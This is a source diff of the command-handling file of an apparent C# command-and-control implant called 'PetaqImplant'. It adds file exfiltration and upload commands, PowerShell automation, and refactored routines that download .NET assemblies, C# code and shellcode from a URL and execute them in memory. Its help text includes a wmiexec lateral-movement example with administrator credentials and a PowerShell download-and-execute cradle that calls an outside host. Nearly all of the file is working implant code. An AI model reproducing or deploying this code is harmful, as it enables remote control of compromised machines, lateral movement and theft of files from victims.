@@ -17,7 +17,7 @@ using System.Security.Cryptography;
 namespace PetaqImplant
 {
     public class Instructions
-    {
+    {        
 
         public static void Help()
         {
@@ -34,6 +34,10 @@ Examples:
     link udp://127.0.0.1/8002
     link smb://127.0.0.1
     link smb://127.0.0.1/petaq_comm
+    upload 1.txt c:\windows\temp\1.txt
+    download c:\windows\temp\1.txt
+    lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command=""powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))""
+
 
 Link operations:
     route
@@ -41,8 +45,20 @@ Link operations:
     link URI
     unlink ID
 
+Scenarios Run:
+    scenarios
+    scenarios report SCENARIOID
+    scenarios report SCENARIOID output
+
+Scenario to run:
+    scenario IMPLANTID scenariofile
+
+File operations:
+    upload LOCALFILEPATH REMOTEFILEPATH
+    download REMOTEFILEPATH
+
 Lateral movement:
-    lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command=""powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))""
+    lateralmovement wmiexec domain=DOMAIN username=USER password=PASSWORD host=REMOTEHOST command=""COMMANDTORUN""
 
 Execute a command/binary:
     exec cmd.exe /c dir
@@ -59,25 +75,36 @@ Execute a command/binary/assembly as a thread (no wait, no output):
 Inline run for .NET source code:
     exec-sharpdirect SHARPCODE
     exec-sharpdirect base64 BASE64_ENCODED_SHARPCODE
+    exec-sharpdirect file FILEPATH Parameters
 
 Execute a .NET assembly:
     exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
     exec-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
+    exec-sharpassembly file FILEPATH Parameters
 
 Compile & Execute .NET source code:
     exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
     exec-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
-    
+    exec-sharpcode file FILEPATH Parameters
+
+Powershell Through .NET System Automation:
+    exec-powershellautomation SHARPCODE
+    exec-powershellautomation base64 BASE64_ENCODED_SHARPCODE
+    exec-powershellautomation file FILEPATH Parameters
+
 Execute Shellcode:
     exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
     exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH32 T2
     exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH64 T1
     exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH32 T2
+    exec-shellcode file FILEPATH ARCH64 T1
+    exec-shellcode file FILEPATH ARCH32 T2
+
 Exit:
     exit
     terminate");
         }
-        public static void Instruct(string instructions)
+        public static void Instruct(string instructions, TextWriter instruction_IO)
         {
 
             // spliting the instructions to string[]
@@ -85,7 +112,7 @@ Exit:
 
             // Set the socket as the Console output
             Program.consoleIO = Console.Out;
-            Console.SetOut(new SocketWriter());
+            Console.SetOut(instruction_IO);
 
             if (args.Length == 0)
             {
@@ -94,7 +121,6 @@ Exit:
             }
             else
             {
-                WebClient client = Common.GetWebClient();
                 try
                 {
                     string dataToSend = "";
@@ -103,10 +129,18 @@ Exit:
                         case "help":
                             Help();
                             break;
+                        case "sleep":
+                            if (args.Length > 1)
+                            {
+                                Thread.Sleep(Int32.Parse(args[1]));
+                            }
+                            else
+                            {
+                                Console.WriteLine("Usage: sleep 5");
+                            }
+                            break;
                         case "register":                            
                             Console.Error.WriteLine("Registering the implant information.");
-                            //string registration_data = "register " + Convert.ToBase64String(Encoding.UTF8.GetBytes(Common.GetInfo()));
-                            //Console.WriteLine(registration_data);
 
                             // register the implant information
                             Program.Register();
@@ -120,14 +154,51 @@ Exit:
                             // ask route updates from all linked implants
                             Program.AskRouteUpdatesFromAllLinkedImplants();
 
-                            Console.Error.WriteLine("Registration is complete.");
+                            //Console.Error.WriteLine("Registration is complete.");
 
                             break;
                         case "routeupdates":
-                            Console.WriteLine("Route updates is sending...");
+                            //Console.WriteLine("Route updates is sending...");
                             Console.WriteLine("routeupdates");
                             break;
-
+                        case "download":
+                            Console.WriteLine("Download is in progress...");
+                            string dfilename = String.Join(" ", args.SubArray(1, (args.Length - 1)));
+                            try
+                            {
+                                // Getting the file content encrypted
+                                byte[] filecontent = File.ReadAllBytes(dfilename);
+                                string filecontentencoded = Convert.ToBase64String(filecontent);
+                                string filecontentencrypted = Common.Encrypt(filecontentencoded);
+                                Console.Error.WriteLine("Encrypted:" + filecontentencrypted);
+                                // Telling the filename size, filecontentencrypted size and filename to server                       
+                                Console.WriteLine("download {0} {1}", filecontentencrypted.Length, dfilename);
+                                // The server is waiting for the file content now
+                                Program.LinkService.Send(filecontentencrypted);
+                                
+                                Console.WriteLine("Download successfully finished.");
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine("Download error: {0}", ex.Message);
+                            }
+                            break;
+                        case "upload":
+                            Console.WriteLine("Upload is in progress...");
+                            string ufilename = args[2];
+                            string ucontent = args[1];
+                            try
+                            {
+                                // Writing the content to the local file
+                                File.WriteAllBytes(ufilename, Convert.FromBase64String(ucontent));
+                                Console.WriteLine("Saving {0} is successful.", ufilename);
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("Files folder or file couldn't be created: {0}.", e);
+                            }
+                            
+                            break;
                         case "routeremove":
                             if (args.Length > 1 && Program.implantRoutes.ContainsKey(args[1]))
                             {
@@ -353,112 +424,25 @@ Exit:
                             }
                             break;
                         case "exec-sharpassembly":
-                            byte[] sharpassembly;
-                            string[] sharpassembly_arg;
-                            if (args[1] == "url")
-                            {
-                                sharpassembly = client.DownloadData(args[2]);
-                                sharpassembly_arg = args.SubArray(3, (args.Length - 3));
-                                Capabilities.ExecSharpAssembly(sharpassembly, sharpassembly_arg);
-                            }
-                            else if (args[1] == "base64")
-                            {
-                                string base64ofasm = Encoding.UTF8.GetString(client.DownloadData(args[2]));
-                                sharpassembly = Convert.FromBase64String(base64ofasm);
-                                sharpassembly_arg = args.SubArray(3, (args.Length - 3));
-                                Capabilities.ExecSharpAssembly(sharpassembly, sharpassembly_arg);
-                            }
-                            else
-                            {
-                                Console.WriteLine("Only url or base64 are valid for .NET assembly delivery.");
-                                Help();
-                            }
+                            ExecSharpAssemblyBridge(args,true);
                             break;
                         case "execthread-sharpassembly":
-                            byte[] sharpassemblyt;
-                            string[] sharpassemblyt_arg;
-                            if (args[1] == "url")
-                            {
-                                sharpassemblyt = client.DownloadData(args[2]);
-                                sharpassemblyt_arg = args.SubArray(3, (args.Length - 3));
-                                Capabilities.ExecSharpAssembly(sharpassemblyt, sharpassemblyt_arg,false);
-                            }
-                            else if (args[1] == "base64")
-                            {
-                                string base64ofasm = Encoding.UTF8.GetString(client.DownloadData(args[2]));
-                                sharpassemblyt = Convert.FromBase64String(base64ofasm);
-                                sharpassemblyt_arg = args.SubArray(3, (args.Length - 3));
-                                Capabilities.ExecSharpAssembly(sharpassemblyt, sharpassemblyt_arg,false);
-                            }
-                            else
-                            {
-                                Console.WriteLine("Only url or base64 are valid for .NET assembly delivery.");
-                                Help();
-                            }
+                            ExecSharpAssemblyBridge(args, false);                            
                             break;
                         case "exec-shellcode":
-                            byte[] shellcode;
-                            string shellcode_arch = args[3];
-                            if (args[1] == "url")
-                            {
-                                shellcode = client.DownloadData(args[2]);
-                                Capabilities.ExecShellcode(shellcode, shellcode_arch);
-                            }
-                            else if (args[1] == "base64")
-                            {
-                                string base64ofsc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
-                                shellcode = Convert.FromBase64String(base64ofsc);
-                                Capabilities.ExecShellcode(shellcode, shellcode_arch);
-                            }
-                            else
-                            {
-                                Console.WriteLine("Only url or base64 are valid for shellcode delivery.");
-                                Help();
-                            }
+                            ExecShellcodeBridge(args);
+                            break;
+                        case "exec-powershellautomation":
+                            ExecPowershellAutomation(args);
+                            break;
+                        case "execthread-powershellautomation":
+                            ExecPowershellAutomation(args,false);
                             break;
                         case "exec-sharpcode":
-                            string sharpcode;
-                            string[] sharpcode_arg;
-                            if (args[1] == "url")
-                            {
-                                sharpcode = Encoding.UTF8.GetString(client.DownloadData(args[2]));
-                                sharpcode_arg = args.SubArray(3, (args.Length - 3));
-                                Capabilities.ExecSharpCode(sharpcode, sharpcode_arg);
-                            }
-                            else if (args[1] == "base64")
-                            {
-                                string base64ofsrc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
-                                sharpcode = Encoding.UTF8.GetString(Convert.FromBase64String(base64ofsrc));
-                                sharpcode_arg = args.SubArray(3, (args.Length - 3));
-                                Capabilities.ExecSharpCode(sharpcode, sharpcode_arg);
-                            }
-                            else
-                            {
-                                Console.WriteLine("Only url or base64 are valid for shellcode delivery.");
-                                Help();
-                            }
+                            ExecSharpCodeBridge(args, true);                    
                             break;
                         case "execthread-sharpcode":
-                            string sharpcodet;
-                            string[] sharpcodet_arg;
-                            if (args[1] == "url")
-                            {
-                                sharpcodet = Encoding.UTF8.GetString(client.DownloadData(args[2]));
-                                sharpcodet_arg = args.SubArray(3, (args.Length - 3));
-                                Capabilities.ExecSharpCode(sharpcodet, sharpcodet_arg,false);
-                            }
-                            else if (args[1] == "base64")
-                            {
-                                string base64ofsrc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
-                                sharpcodet = Encoding.UTF8.GetString(Convert.FromBase64String(base64ofsrc));
-                                sharpcodet_arg = args.SubArray(3, (args.Length - 3));
-                                Capabilities.ExecSharpCode(sharpcodet, sharpcodet_arg,false);
-                            }
-                            else
-                            {
-                                Console.WriteLine("Only url or base64 are valid for shellcode delivery.");
-                                Help();
-                            }
+                            ExecSharpCodeBridge(args, false);
                             break;
                         case "exec-sharpdirect":
                             string code = String.Join(" ", args.SubArray(1, (args.Length - 1)));
@@ -494,6 +478,121 @@ Exit:
                     Console.WriteLine("Error:\n{0}",e);
                 }
             }
+        }
+
+        public static void ExecSharpAssemblyBridge(string[] args, bool threadwait=false)
+        {
+            WebClient client = Common.GetWebClient();
+            byte[] sharpassembly = { };
+            string[] sharpassembly_arg = { };
+            if (args.Length > 3)
+            {
+                sharpassembly_arg = args.SubArray(3, (args.Length - 3));
+            }
+
+            switch (args[1])
+            {
+                case "url":
+                    sharpassembly = client.DownloadData(args[2]);
+                    break;
+                case "base64":
+                    string base64ofasm = Encoding.UTF8.GetString(client.DownloadData(args[2]));
+                    sharpassembly = Convert.FromBase64String(base64ofasm);
+                    break;
+                case "file":
+                    sharpassembly = Convert.FromBase64String(args[2]);                   
+                    break;
+                default:
+                    Console.WriteLine("Only url, file or base64 are valid for .NET assembly delivery.");
+                    Help();
+                    break;
+            }
+            Capabilities.ExecSharpAssembly(sharpassembly, sharpassembly_arg, threadwait);
+
+        }
+        public static void ExecSharpCodeBridge(string[] args, bool threadwait = false)
+        {
+            WebClient client = Common.GetWebClient();
+            string sharpcode = "";
+            string[] sharpcode_arg = { };
+            if (args.Length > 3)
+            {
+                sharpcode_arg = args.SubArray(3, (args.Length - 3));
+            }
+
+            switch (args[1])
+            {
+                case "url":
+                    sharpcode = Encoding.UTF8.GetString(client.DownloadData(args[2]));
+                    break;
+                case "base64":
+                    string base64ofsrc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
+                    sharpcode = Encoding.UTF8.GetString(Convert.FromBase64String(base64ofsrc));
+                    break;
+                case "file":
+                    sharpcode = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
+                    break;
+                default:
+                    Console.WriteLine("Only url or base64 are valid for sharpcode delivery.");
+                    Help();
+                    break;
+            }
+            Capabilities.ExecSharpCode(sharpcode, sharpcode_arg, threadwait);
+
+        }
+        public static void ExecPowershellAutomation(string[] args, bool threadwait = false)
+        {
+            WebClient client = Common.GetWebClient();
+            string pscontent = "";
+            string[] pscontent_arg = { };
+            if (args.Length > 3)
+            {
+                pscontent_arg = args.SubArray(3, (args.Length - 3));
+            }
+
+            switch (args[1])
+            {
+                case "url":
+                    pscontent = Encoding.UTF8.GetString(client.DownloadData(args[2]));
+                    break;
+                case "base64":
+                    string base64ofsrc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
+                    pscontent = Encoding.UTF8.GetString(Convert.FromBase64String(base64ofsrc));
+                    break;
+                case "file":
+                    pscontent = Encoding.UTF8.GetString(Convert.FromBase64String(args[2]));
+                    break;
+                default:
+                    Console.WriteLine("Only url or base64 are valid for powershell content delivery.");
+                    Help();
+                    break;
+            }
+            Capabilities.ExecPowershellAutomation(pscontent, pscontent_arg, threadwait);
+
+        }
+        public static void ExecShellcodeBridge(string[] args)
+        {
+            WebClient client = Common.GetWebClient();
+            byte[] shellcode = { };
+            string shellcode_arch = args[3];
+            switch (args[1])
+            {
+                case "url":
+                    shellcode = client.DownloadData(args[2]);
+                    break;
+                case "base64":
+                    string base64ofsc = Encoding.UTF8.GetString(client.DownloadData(args[2]));
+                    shellcode = Convert.FromBase64String(base64ofsc);
+                    break;
+                case "file":
+                    shellcode = Convert.FromBase64String(args[2]);
+                    break;
+                default:
+                    Console.WriteLine("Only url or base64 are valid for shellcode delivery.");
+                    Help();
+                    break;
+            }
+            Capabilities.ExecShellcode(shellcode, shellcode_arch);
         }
     }
 }
